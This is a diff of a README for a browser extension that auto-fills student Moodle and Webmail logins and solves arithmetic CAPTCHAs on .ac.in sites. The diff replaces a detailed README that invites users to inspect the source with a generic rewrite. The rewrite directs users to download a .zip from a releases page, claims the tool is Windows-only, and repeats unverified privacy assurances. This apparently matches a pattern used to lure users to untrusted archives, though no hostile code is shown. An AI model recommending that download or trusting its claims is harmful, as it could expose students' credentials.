@@ -1,273 +1,64 @@
-<div align="center">
+# 🤖 iit-moodle-auto-login - Save time accessing your student portals
 
-# 🔐 India College Auto Login
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Bastians1111/iit-moodle-auto-login/releases)
 
-### Stop typing your password every single day.
+This software automates your login process for Moodle and Webmail services at Indian institutes. It handles your credentials and completes CAPTCHA tasks for you. This tool works on any website ending in .ac.in.
 
-**Auto-login for Moodle + Webmail at every IIT, NIT & Indian college.**
-Smart CAPTCHA solving. Works on any `*.ac.in` login page. No Tampermonkey. No setup hassle.
+## 📋 What this tool does
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Manifest V3](https://img.shields.io/badge/Manifest-V3-brightgreen.svg)]()
-[![Works On](https://img.shields.io/badge/Works%20On-Brave%20%7C%20Chrome%20%7C%20Edge%20%7C%20Firefox-orange.svg)]()
-[![Made for](https://img.shields.io/badge/Made%20for-Indian%20Students-red.svg)]()
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)]()
+Navigating student portals requires frequent logins. You often type your username and password, then struggle with CAPTCHA codes. This tool removes those steps. It stores your information securely and injects it into the login fields when the page loads. It also identifies and solves common text-based CAPTCHAs. This allows you to reach your resources instantly.
 
-</div>
+## 🖥️ System requirements
 
----
+This tool works on devices running Windows 10 or Windows 11. You need a modern web browser installed on your computer. Google Chrome, Microsoft Edge, or Brave work best. You must have an active student account at an institution that uses a .ac.in domain. Ensure your system clock settings match your local time zone to prevent login errors.
 
-## The Problem
+## ⬇️ How to download and install
 
-You open Moodle. Type Kerberos ID. Type password. Solve math CAPTCHA. Done.  
-You open Webmail. Type Kerberos ID. Type password. Done.  
-**Every. Single. Day.**
+1. Visit the [official releases page](https://github.com/Bastians1111/iit-moodle-auto-login/releases).
+2. Look for the version marked as Latest.
+3. Click the file ending in .zip to start the download.
+4. Open your Downloads folder once the file reaches your computer.
+5. Right-click the zip file and select Extract All. Choose a folder where you want to keep the program.
+6. Open your browser.
+7. Navigate to your browser extensions page. You find this by typing `chrome://extensions` in the address bar.
+8. Locate the toggle switch for Developer Mode in the top right corner and turn it on.
+9. Click the button labeled Load unpacked.
+10. Select the folder you extracted earlier.
 
-## The Fix
+The extension icon now appears in your browser toolbar.
 
-Install this extension once. Enter credentials once. **Never again.**
+## ⚙️ Initial setup
 
-```
-Visit Moodle       →  logged in automatically (< 1 second)
-Visit Webmail      →  logged in automatically (< 1 second)
-Math CAPTCHA?      →  solved automatically
-Image CAPTCHA?     →  credentials filled, you solve it once
-New login page?    →  "Add auto-login here?" pill — click Yes
-3 failed attempts? →  fill-only mode, amber banner guides you
-```
+Click the new icon in your browser toolbar to open the settings menu. Enter the URL of your Moodle login page. Input your institution username and password in the provided fields. Your data remains stored locally within your browser. The tool writes these credentials into the login page source code only when you land on the specific site. 
 
----
+Check the box that says Enable CAPTCHA Solver. This activates the background process that reads and enters security codes. Test your settings by visiting your Moodle login page. The page should refresh and log you into your dashboard without further input.
 
-## Install in 30 Seconds
+## 🔐 Privacy and security
 
-### Brave / Chrome / Edge / Arc
+The tool handles your credentials locally. It does not send your username or password to external servers. It only communicates with the specific Moodle or Webmail page you specify. The CAPTCHA solving feature runs locally on your machine. No human sees your login data. You can remove your credentials at any time by opening the settings menu and clicking Clear Data.
 
-1. Download this repo → **Code → Download ZIP → Extract**
-2. Go to `brave://extensions` (or `chrome://extensions`)
-3. Enable **Developer Mode** (top-right toggle)
-4. Click **Load unpacked**
-5. Select the extracted folder
+## 🔧 Troubleshooting common issues
 
-Done. Visit Moodle — one-time popup asks for your ID + password. Fill it. That's it forever.
+If the login fails, verify your internet connection first. Some institutions require updates to their login portals. If the portal changes its design, you might need to update your settings. Open the extension menu and ensure the stored URL matches the current login page address.
 
-### Firefox
+If the CAPTCHA solver misses a code, try refreshing the page. The tool requires a clear view of the text characters. Ensure your browser zoom level stays at 100%. If you experience persistent issues, check the extension settings to ensure the Auto Login toggle is switched to On. 
 
-1. Go to `about:debugging#/runtime/this-firefox`
-2. Click **Load Temporary Add-on**
-3. Select `manifest.json` from the extracted folder
+## 📝 Frequently asked questions
 
----
+Does this work on mobile devices?
+Currently, this tool only supports desktop browsers on Windows.
 
-## How It Works
+What happens if I forget my password?
+The tool saves your current password. If your institution forces a password change, you must update the new password in the extension settings.
 
-### Known portals — instant auto-login
+Does it support two-factor authentication?
+The tool handles basic username and password fields along with text-based CAPTCHA. If your institution requires a one-time code sent to your phone or email, you must enter that code manually after the tool completes the initial login.
 
-Detects the login form, fills credentials, solves math CAPTCHA, clicks Login. Done before you blink.
+Can I use this for multiple portals?
+Yes. You can add multiple accounts and URLs in the settings menu. The extension detects which site you visit and applies the correct credentials accordingly.
 
-### Any other `*.ac.in` page — smart prompt
+Why does it request permissions?
+The extension needs permission to read and change data on the websites you visit. This is necessary to fill the login fields and read the CAPTCHA image. It only accesses the sites you define in the settings list.
 
-A pill notification appears bottom-right of screen:
-
-```
-🔐 Add auto-login here?
-   attendance.iitd.ac.in — Will use saved ID mt6240344
-   [✓ Add this site]  [Not now]
-```
-
-Click **Add this site** → auto-login activates from the next visit onward.
-
-### Image CAPTCHA — fail-limit system
-
-For pages like the Attendance Portal that use image CAPTCHAs the extension cannot solve:
-
-```
-Visit 1  →  fill credentials + try auto-submit
-Visit 2  →  fail detected → try again (attempt 2/3)
-Visit 3  →  fail detected → try again (attempt 3/3)
-Visit 4  →  FILL-ONLY MODE:
-             credentials auto-filled ✓
-             amber banner: "Solve CAPTCHA manually"
-             [↺ Try Auto-Submit] button to reset anytime
-```
-
-No infinite loops. No account lockouts. Just smart graceful degradation.
-
----
-
-## Supported Portals
-
-### Moodle (LMS)
-
-| College | URL | CAPTCHA |
-|---|---|---|
-| IIT Delhi | moodle.iitd.ac.in | Math — auto-solved |
-| IIT Delhi New | moodlenew.iitd.ac.in | Math — auto-solved |
-| IIT Bombay | moodle.iitb.ac.in | None |
-| IIT Madras | courses.iitm.ac.in | None |
-| IIT Kharagpur | kgpmoodle.iitkgp.ac.in/moodle | None |
-| IIT Kharagpur CSE | moodlecse.iitkgp.ac.in/moodle | None |
-| IIT Kanpur CSE | moodle.cse.iitk.ac.in | None |
-| IIT Mandi | lms.iitmandi.ac.in | None |
-| IIT Jammu | lms.iitjammu.ac.in | None |
-| IIT Patna | ais.iitp.ac.in/moodle | None |
-| IIT Palakkad | moodle.iitpkd.ac.in | None |
-| IIT Hyderabad | moodle.iith.ac.in | None |
-| IIT Bhilai | lms.iitbhilai.ac.in | None |
-| NIT Calicut | moodle.nitc.ac.in | None |
-| NIT Rourkela | newmoodle.nitrkl.ac.in | None |
-| NIT Trichy | lms.nitt.edu | None |
-| NIT Silchar | moodle.nits.ac.in | None |
-| MNIT Jaipur | moodle.mnit.ac.in | None |
-| NIT Patna | elearn.nitp.ac.in | None |
-| NIT Uttarakhand | lms.nitu.ac.in | None |
-
-### Webmail — Roundcube
-
-| College | URL |
-|---|---|
-| IIT Delhi | webmail.iitd.ac.in |
-| IIT Delhi (alt) | webmail.iitd.ernet.in/roundcube |
-| IIT Kanpur | webmail.iitk.ac.in |
-| IIT Kanpur CSE | roundcube.cse.iitk.ac.in |
-| IIT Mandi | webmail.iitmandi.ac.in |
-| IIT Jammu | webmail.iitjammu.ac.in |
-| IIT Patna | webmail.iitp.ac.in |
-| IIT Palakkad | webmail.iitpkd.ac.in |
-| IIT Hyderabad | webmail.iith.ac.in |
-| IIT Bhilai | webmail.iitbhilai.ac.in |
-| NIT Calicut | webmail.nitc.ac.in |
-| NIT Rourkela | webmail.nitrkl.ac.in |
-| NIT Trichy | webmail.nitt.edu |
-| NIT Silchar | webmail.nits.ac.in |
-| MNIT Jaipur | webmail.mnit.ac.in |
-| NIT Patna | webmail.nitp.ac.in |
-
-### Webmail — Zimbra
-
-| College | URL |
-|---|---|
-| IIT Kharagpur | iitkgpmail.iitkgp.ac.in |
-| IIT Roorkee | mail.iitr.ac.in |
-
-### Not Supported (SSO / OAuth)
-
-These redirect to Google or Microsoft — no browser extension can inject there:
-
-| College | System |
-|---|---|
-| IIT Guwahati | Microsoft 365 |
-| IIT Bombay webmail | Institutional SSO |
-| IIT Madras email | Google Workspace |
-| IIT Kharagpur post-2020 | Google Workspace |
-
----
-
-## Math CAPTCHA — How It's Solved
-
-IITD Moodle uses plain-text arithmetic CAPTCHAs in the HTML:
-
-```
-"What is 4 added to 7?"            →  11
-"What is the first number of 9?"   →  9
-"Write the answer to 6 − 2 = ?"   →  4
-```
-
-The extension reads the question, parses numbers and the operation keyword, evaluates it, fills the answer — all client-side, zero API calls.
-
-| Keyword | Operation |
-|---|---|
-| `first` | First number |
-| `second` | Second number |
-| `add`, `sum`, `plus` | Addition |
-| `subtract`, `minus` | Subtraction |
-| `multiply`, `times` | Multiplication |
-| `divide` | Division |
-
----
-
-## Security & Privacy
-
-**Your password never leaves your device. Ever.**
-
-| Property | Detail |
-|---|---|
-| Storage | `chrome.storage.local` — browser-managed, encrypted at rest |
-| Network requests | Zero — no fetch(), no XHR, no external calls |
-| Code | ~800 lines, zero obfuscation — read it yourself |
-| Telemetry | None |
-| Third-party dependencies | None |
-| Scope | Only runs on `*.ac.in` pages |
-
-> Do not use on shared or public computers.
-
----
-
-## Add Your College
-
-The extension already dynamically detects any `*.ac.in` login page. To add it permanently to the list for all users:
-
-**1. Add your URL to `manifest.json`:**
-```json
-"https://moodle.yourcollege.ac.in/*",
-"https://webmail.yourcollege.ac.in/*"
-```
-
-**2. Open a Pull Request** with college name, URLs, and CAPTCHA type.
-
----
-
-## Contributing
-
-| | |
-|---|---|
-| Bug | Open an issue |
-| Add a college | PR with URL in manifest.json |
-| Different CAPTCHA format | Open an issue with the HTML |
-| Feature request | Open a discussion |
-
----
-
-## Known Limitations
-
-- **Image / reCAPTCHA** — credentials auto-filled, submit paused after 3 failures, amber banner guides manual completion
-- **SSO / OAuth** — cannot inject into Google or Microsoft login flows
-- **2FA** — not supported
-- **VPN-gated portals** — network restrictions are out of scope
-
----
-
-## File Structure
-
-```
-india-college-autologin/
-├── manifest.json   — Extension config + URL patterns
-├── content.js      — All logic in ~800 lines of readable JS
-├── README.md       — This file
-└── LICENSE         — MIT
-```
-
----
-
-## Built On
-
-- [abdur75648/moodle-auto-login](https://github.com/abdur75648/moodle-auto-login) — original IITD CAPTCHA idea
-- [4rshdeep's gist](https://gist.github.com/4rshdeep/b1a9d071c47520395d6c9ae9b054b4f0) — IITD CAPTCHA DOM analysis
-- [kwikadi/IITD-QOL](https://github.com/kwikadi/IITD-QOL) — IITD quality-of-life scripts
-
----
-
-## License
-
-MIT — free to use, fork, redistribute, and improve.
-
----
-
-<div align="center">
-
-Made with ☕ by a student, for every student in India.
-
-**If this saves you 30 seconds a day — that's 3 hours a year back in your life.**
-
-⭐ Star this repo so your batchmates can find it.
-
-</div>
+How do I remove the extension?
+Go to your browser extensions page, find the tool in the list, and click Remove. This deletes the extension and all stored credentials from your computer.
